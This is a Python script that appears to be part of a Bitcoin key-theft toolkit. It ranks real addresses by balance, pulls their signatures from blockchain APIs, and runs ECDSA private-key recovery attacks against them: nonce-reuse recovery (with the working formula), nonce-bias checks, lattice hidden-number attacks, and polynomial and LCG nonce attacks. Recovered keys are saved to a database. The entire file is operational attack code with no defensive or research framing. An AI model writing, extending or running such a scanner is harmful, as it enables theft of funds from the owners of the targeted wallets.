#!/usr/bin/env python3
"""
Deep scanner for dormant/high-value Bitcoin addresses.
Extracts maximum signatures from Spent/Active addresses and runs all attack vectors:
1. R-reuse (same nonce, different message) -> instant key recovery
2. Nonce bias (small R, LSB patterns) -> lattice attack
3. Cross-TX nonce relations (LCG, delta, multiplicative) -> algebraic recovery
4. Brainwallet dictionary scan -> for all tracked addresses
"""
import time
import json
import sys
from db_manager import (
    get_connection, init_db, save_signatures, mark_analyzed,
    add_recovered_key, add_finding, upsert_address
)
from tx_preimage_reconstructor import extract_sigs_with_real_z
from lattice_nonce_analyzer import verify_key, solve_hnp
from collections import Counter

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def get_targets(min_sigs_needed=2, limit=50):
    """Get Spent/Active addresses sorted by value, prioritizing those needing more sigs."""
    conn = get_connection()
    c = conn.cursor()
    
    # Get all spent/active addresses with their current sig count
    c.execute("""
        SELECT a.address, COALESCE(a.current_balance, a.balance, 0) as bal,
               a.label, a.type,
               COALESCE(s.sig_count, 0) as existing_sigs
        FROM addresses a
        LEFT JOIN (SELECT address, COUNT(*) as sig_count FROM signatures GROUP BY address) s
            ON a.address = s.address
        WHERE a.status IN ('Spent/Active', 'Target')
        ORDER BY bal DESC
        LIMIT ?
    """, (limit,))
    rows = c.fetchall()
    conn.close()
    return rows

def extract_sigs_for_address(address, existing_count=0, max_sigs=256):
    """Extract signatures for an address using all available API sources."""
    needed = max_sigs - existing_count
    if needed <= 0:
        return existing_count
    
    print(f"  Fetching up to {needed} new sigs for {address}...")
    try:
        sigs = extract_sigs_with_real_z(address, max_pages=50, max_sigs=needed)
        if sigs:
            save_signatures(address, sigs)
            total = existing_count + len(sigs)
            print(f"  Got {len(sigs)} new sigs (total: {total})")
            return total
    except Exception as e:
        print(f"  Mempool error: {e}")
    
    # Fallback: try multi-source API for deeper history
    try:
        from api_client import api
        from tx_preimage_reconstructor import extract_sigs_from_txids
        
        print(f"  Trying alternative sources for {address}...")
        txids = api.get_address_txids(address, max_txs=200)
        if txids:
            print(f"  Found {len(txids)} TXIDs via alternative source")
            sigs = extract_sigs_from_txids(address, txids, max_sigs=needed)
            if sigs:
                save_signatures(address, sigs)
                total = existing_count + len(sigs)
                print(f"  Got {len(sigs)} new sigs (total: {total})")
                return total
    except Exception as e:
        print(f"  Fallback API error: {e}")
    
    print(f"  No spending transactions found")
    return existing_count

def check_r_reuse(address):
    """Check for R-reuse with different Z values (instant key recovery)."""
    conn = get_connection()
    c = conn.cursor()
    c.execute("""
        SELECT r_int, s_int, z_int, txid, vin 
        FROM signatures WHERE address = ?
    """, (address,))
    rows = c.fetchall()
    conn.close()
    
    if len(rows) < 2:
        return False
    
    r_groups = {}
    for r_int, s_int, z_int, txid, vin in rows:
        r = int(r_int)
        if r not in r_groups:
            r_groups[r] = []
        r_groups[r].append({'s': int(s_int), 'z': int(z_int), 'txid': txid, 'vin': vin})
    
    for r, group in r_groups.items():
        if len(group) < 2:
            continue
        for i in range(len(group)):
            for j in range(i + 1, len(group)):
                if group[i]['z'] != group[j]['z']:
                    # EXPLOITABLE R-REUSE!
                    s1, z1 = group[i]['s'], group[i]['z']
                    s2, z2 = group[j]['s'], group[j]['z']
                    
                    k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
                    d = ((s1 * k - z1) * pow(r, -1, P)) % P
                    
                    if verify_key(d, address):
                        d_hex = hex(d)[2:].zfill(64)
                        print(f"  !!! KEY RECOVERED via R-REUSE: {d_hex[:20]}...")
                        add_recovered_key(address, d_hex, method='R-Reuse')
                        return True
                    else:
                        print(f"  R-reuse found but key verification failed (computing error?)")
    return False

def check_nonce_bias(address):
    """Check for biased nonces (small R, LSB patterns)."""
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT r_int, r_bits FROM signatures WHERE address = ?", (address,))
    rows = c.fetchall()
    conn.close()
    
    if not rows:
        return None
    
    r_values = [int(row[0]) for row in rows]
    r_bits = [row[1] for row in rows if row[1]]
    
    findings = []
    
    # Check for small R values
    small_count = sum(1 for b in r_bits if b and b < 200)
    if small_count > 0:
        findings.append(f"small_r:{small_count}")
        print(f"  Small R values: {small_count}/{len(r_bits)}")
    
    # Check LSB bias
    for bits in [1, 2, 3, 4, 8]:
        mod = 1 << bits
        counts = Counter([r % mod for r in r_values])
        for val, count in counts.items():
            ratio = count / len(r_values)
            if ratio >= 0.7 and len(r_values) >= 4:
                findings.append(f"lsb_{bits}bit_val{val}:{ratio:.2f}")
                print(f"  LSB bias: {bits}-bit mod={mod}, val={val}, ratio={ratio:.2f}")
    
    return findings if findings else None

def run_lattice_attacks(address):
    """Run HNP lattice attack with various bias assumptions."""
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT r_int, s_int, z_int FROM signatures WHERE address = ?", (address,))
    rows = c.fetchall()
    conn.close()
    
    if len(rows) < 2:
        return False
    
    sigs = [{'r': int(r), 's': int(s), 'z': int(z)} for r, s, z in rows]
    
    # Try different bias assumptions
    for bias_bits in [4, 8, 12, 16, 20, 24, 32]:
        subset = sigs[:min(len(sigs), 30)]
        key = solve_hnp(subset, bias_bits, address=address)
        if key:
            key_hex = hex(key)[2:].zfill(64)
            print(f"  !!! KEY RECOVERED via LATTICE (bias={bias_bits}): {key_hex[:20]}...")
            add_recovered_key(address, key_hex, method=f'Lattice HNP ({bias_bits}-bit)')
            return True
    
    return False

def run_algebraic_attacks(address):
    """Try nonce delta, multiplicative, and LCG attacks."""
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT r_int, s_int, z_int, txid FROM signatures WHERE address = ?", (address,))
    rows = c.fetchall()
    conn.close()
    
    if len(rows) < 2:
        return False
    
    sigs = [{'r': int(r), 's': int(s), 'z': int(z), 'txid': txid} for r, s, z, txid in rows]
    
    try:
        from advanced_nonce_attacks import try_nonce_delta, try_nonce_multiplicative, try_nonce_lcg
        
        if try_nonce_delta(sigs, address):
            return True
        if try_nonce_multiplicative(sigs, address):
            return True
        if len(sigs) >= 4 and try_nonce_lcg(sigs, address):
            return True
    except Exception as e:
        print(f"  Algebraic attack error: {e}")
    
    return False

def deep_scan(max_addresses=50, skip_fetch=False):
    init_db()
    
    targets = get_targets(limit=max_addresses)
    print(f"Deep scan: {len(targets)} target addresses")
    print(f"{'='*70}")
    
    results = {'scanned': 0, 'with_sigs': 0, 'r_reuse': 0, 'lattice': 0, 'polynonce': 0, 'algebraic': 0}
    
    for addr, bal, label, addr_type, existing_sigs in targets:
        results['scanned'] += 1
        print(f"\n[{results['scanned']}/{len(targets)}] {addr}")
        print(f"  Balance: {bal} BTC | Label: {label or '-'} | Type: {addr_type or '-'} | Sigs: {existing_sigs}")
        
        # Step 1: Extract signatures if needed
        if not skip_fetch and existing_sigs < 256:
            sig_count = extract_sigs_for_address(addr, existing_sigs)
            time.sleep(0.3)  # Rate limit
        else:
            sig_count = existing_sigs
        
        if sig_count < 2:
            print(f"  Skipping attacks (need >= 2 sigs, have {sig_count})")
            continue
        
        results['with_sigs'] += 1
        
        # Step 2: Check R-reuse (fastest, most reliable)
        print(f"  Checking R-reuse...")
        if check_r_reuse(addr):
            results['r_reuse'] += 1
            mark_analyzed(addr)
            continue
        
        # Step 3: Check nonce bias
        print(f"  Checking nonce bias...")
        bias = check_nonce_bias(addr)
        
        # Step 4: Lattice attack
        if sig_count >= 4:
            print(f"  Running lattice attack...")
            if run_lattice_attacks(addr):
                results['lattice'] += 1
                mark_analyzed(addr)
                continue
        
        # Step 5: Polynonce attack (polynomial nonce relations)
        if sig_count >= 4:
            print(f"  Running polynonce attack...")
            try:
                from polynonce_attack import try_polynonce_linear, try_polynonce_quadratic
                conn = get_connection()
                c = conn.cursor()
                c.execute("SELECT r_int, s_int, z_int, txid FROM signatures WHERE address = ?", (addr,))
                rows = c.fetchall()
                conn.close()
                pn_sigs = [{'r': int(r), 's': int(s), 'z': int(z), 'txid': txid} for r, s, z, txid in rows]
                if try_polynonce_linear(pn_sigs, addr) or try_polynonce_quadratic(pn_sigs, addr):
                    results['polynonce'] += 1
                    mark_analyzed(addr)
                    continue
            except Exception as e:
                print(f"  Polynonce error: {e}")

        # Step 6: Algebraic attacks
        print(f"  Running algebraic attacks...")
        if run_algebraic_attacks(addr):
            results['algebraic'] += 1
            mark_analyzed(addr)
            continue
        
        mark_analyzed(addr)
        print(f"  No vulnerability found")
    
    # Summary
    print(f"\n{'='*70}")
    print(f"DEEP SCAN COMPLETE")
    print(f"  Addresses scanned: {results['scanned']}")
    print(f"  With enough sigs:  {results['with_sigs']}")
    print(f"  Keys via R-reuse:  {results['r_reuse']}")
    print(f"  Keys via Lattice:  {results['lattice']}")
    print(f"  Keys via Polynonce:{results['polynonce']}")
    print(f"  Keys via Algebra:  {results['algebraic']}")
    total = results['r_reuse'] + results['lattice'] + results['polynonce'] + results['algebraic']
    print(f"  TOTAL RECOVERED:   {total}")

if __name__ == "__main__":
    limit = int(sys.argv[1]) if len(sys.argv) > 1 else 20
    skip = '--skip-fetch' in sys.argv
    deep_scan(max_addresses=limit, skip_fetch=skip)
